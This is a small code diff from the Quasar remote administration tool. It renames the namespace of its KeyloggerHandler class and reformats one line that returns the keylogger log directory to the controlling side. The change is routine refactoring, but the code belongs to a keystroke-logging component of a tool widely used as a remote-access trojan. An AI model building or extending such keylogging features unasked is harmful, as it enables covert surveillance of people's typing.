@@ -2,7 +2,7 @@
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 
-namespace Quasar.Client.Messages
+namespace Quasar.Client.MessageHandlers
 {
     public class KeyloggerHandler : IMessageProcessor
     {
@@ -22,7 +22,7 @@ namespace Quasar.Client.Messages
 
         public void Execute(ISender client, GetKeyloggerLogsDirectory message)
         {
-            client.Send(new GetKeyloggerLogsDirectoryResponse {LogsDirectory = Settings.LOGSPATH });
+            client.Send(new GetKeyloggerLogsDirectoryResponse { LogsDirectory = Settings.LOGSPATH });
         }
     }
 }
